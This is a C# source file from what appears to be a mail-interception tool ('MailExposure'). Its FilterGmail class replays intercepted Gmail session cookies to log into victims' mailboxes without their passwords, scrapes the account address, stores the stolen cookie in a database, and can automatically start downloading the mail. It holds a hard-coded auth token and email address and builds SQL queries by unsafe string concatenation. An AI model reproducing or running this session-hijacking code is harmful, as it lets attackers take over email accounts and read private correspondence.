using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Net;

namespace MailExposure.CookieMailRC
{
    class FilterGmail:DisplaceNew
    {
        // Fields
        private bool Auto;
        private string cookieRemarks;
        private string nameTemp;
        private string ower;
        private string strCookie;
        private string urls;
        private int userIndex;
        private string userListNames;
        private string UserName;
        private string userType;

        // Methods
        public FilterGmail(string url, string strCookie, string interceptTime, string userList, bool Auto, string cookieRemarks)
        {
            this.urls = "";
            this.UserName = "";
            this.nameTemp = "";
            this.strCookie = "";
            this.userListNames = "";
            this.cookieRemarks = "";
            this.userType = "'无密用户'";
            this.ower = "'capGmail'";
            base.url = url;
            base.cookie = strCookie;
            this.strCookie = strCookie;
            base.interceptTime = interceptTime;
            this.userListNames = userList;
            this.Auto = Auto;
            this.cookieRemarks = cookieRemarks;

        }

        public void loginUser()
        {
            base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
            base.streamControl = true;
            base.MyStringBuilder = this.Request(base.url);
            base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
            base.streamControl = true;
            base.MyStringBuilder = this.Request("http://mail.google.com/mail/?ui=html&amp;amp;zy=l&amp;pli=1&amp;auth=DQAAAHAAAACMe2g-IY3nJUaTPU1xypZ0iIyyu-fHrHwscWJuO0yOHibPuJmLsceT_7pNbh2M5bhUCyMWM8eVYcWOE5HpoImp0sDOEcGm3k9sJ0hX0BTVV9ThLVM3c9do_levIHmh1ar80I2Q1HB-STxJaoQQKAhm&amp;gausr=aphelloemail%40gmail.com");
            string message = base.MyStringBuilder.ToString();
            if (message.IndexOf("class=\"hdn\"") != -1)
            {
                this.userIndex = message.IndexOf("class=\"hdn\"");
                this.nameTemp = base.putstr(message, "<b>", "</b>", this.userIndex);
                if (this.nameTemp != "-1")
                {
                    if (this.nameTemp.IndexOf("@") != -1)
                    {
                        this.UserName = this.nameTemp;
                    }
                    else
                    {
                        this.UserName = "";
                    }
                }
            }
            if ((this.UserName != "") && (this.UserName != null))
            {
                if (this.urls == "")
                {
                    this.urls = base.url;
                }
                string str2 = "'" + this.UserName + "'";
                string str3 = "'" + this.strCookie + "'";
                string str4 = "'G'";
                string str5 = "'" + base.interceptTime + "'";
                string str6 = "'是'";
                if (this.cookieRemarks.Length > 0)
                {
                    this.ower = "'" + this.cookieRemarks + "'";
                }
                else
                {
                    this.ower = "'" + DateTime.Now.ToString("yyyMMdd") + "'";
                }
                string str7 = this.Auto ? "1" : "0";
                str7 = "'" + str7 + "'";
                this.userListNames = "'" + this.userListNames + "'";
                string strSql = "insert into users(属主,用户名,服务器,服务器地址,方向,邮件地址,验证登陆,时间限制,用户类型,全部接收,用户列表,自动收取) values(" + this.ower + "," + str2 + "," + str4 + "," + str4 + ",'capGmail','" + this.urls + "'," + str3 + "," + str5 + "," + this.userType + "," + str6 + "," + this.userListNames + "," + str7 + ")";
                string str9 = "select count(*)from users where 服务器地址=" + str4 + "and 用户名=" + str2 + "and 用户类型=" + this.userType;
                string str10 = "update users set 邮件地址='" + base.url + "',验证登陆=" + str3 + " where 服务器地址=" + str4 + "and 用户名=" + str2 + "and 用户类型=" + this.userType;
                if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(str9)) <= 0)
                {
                    GlobalValue.mainForm.ExecuteSQL(strSql);
                    GlobalValue.mainForm.listBoxView.Items.Add("添加用户:" + this.UserName);
                    GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                    GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                    foreach (TreeNode node2 in GlobalValue.mainForm.treeViewUsers.Nodes[0].Nodes)
                    {
                        if (node2.Text == this.userListNames.Trim(new char[] { '\'' }))
                        {
                            GlobalValue.mainForm.treeViewUsers.SelectedNode = node2;
                        }
                    }
                    if (this.Auto)
                    {
                        new BeginReceiveThreads(1, "G", "G", this.UserName, "", this.ower.Trim(new char[] { '\'' }), "capGmail", 0, base.url, this.strCookie, this.userType, this.userListNames.Trim(new char[] { '\'' })).Execute();
                    }
                }
                else
                {
                    str9 = "select 时间限制 from users where 服务器地址=" + str4 + "and 用户名=" + str2 + "and 用户类型=" + this.userType;
                    DateTime time = DateTime.Parse(GlobalValue.mainForm.ExecuteSQL(str9));
                    if (DateTime.Compare(DateTime.Parse(base.interceptTime), time) > 0)
                    {
                        GlobalValue.mainForm.ExecuteSQL(str10);
                        GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]:修改用户!");
                        GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                        GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                        foreach (TreeNode node in GlobalValue.mainForm.treeViewUsers.Nodes[0].Nodes)
                        {
                            if (node.Text == this.userListNames.Trim(new char[] { '\'' }))
                            {
                                GlobalValue.mainForm.treeViewUsers.SelectedNode = node;
                            }
                        }
                        if (this.Auto)
                        {
                            new BeginReceiveThreads(1, "G", "G", this.UserName, "", this.ower.Trim(new char[] { '\'' }), "capGmail", 0, base.url, this.strCookie, this.userType, this.userListNames.Trim(new char[] { '\'' })).Execute();
                        }
                    }
                }
            }
            else
            {
                GlobalValue.mainForm.listBoxView.Items.Add("Cookie 可能已失效");
                GlobalValue.mainForm.listBoxView.Items.Add("结束过滤");
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
            }

        }
        private StringBuilder Request(string url)
        {
            try
            {
                StreamReader reader;
                if (url.IndexOf("https://www.google.com/accounts/ServiceLogin?") != -1)
                {
                    base.cookie = this.strCookie;
                }
                else if (url.IndexOf("https://mail.google.com/mail/?ui=html") != -1)
                {
                    base.cookie = base.putstr(base.cookie, "SID=", ";", 0);
                    if (base.cookie != "-1")
                    {
                        base.cookie = "SID=" + base.cookie + ";";
                        base.cookie = base.cookie.Replace("; ;", ";");
                    }
                }
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.Accept = "*/*";
                request.AllowAutoRedirect = false;
                request.ServicePoint.Expect100Continue = false;
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Accept-Language: zh-cn");
                request.Headers.Add("Cookie", base.cookie);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                if (headers["Content-Type"] != null)
                {
                    string str = "";
                    str = headers["Content-Type"];
                    if (str.IndexOf("charset=") >= 0)
                    {
                        base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                    }
                }
                Thread.Sleep(10);
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str2 = reader.ReadLine(); str2 != null; str2 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str2 + "\r\n");
                        str2 = null;
                    }
                    base.streamControl = false;
                }
                reader.Close();
            }
            catch (Exception)
            {
            }
            return base.MyStringBuilder;

        }

    }
}
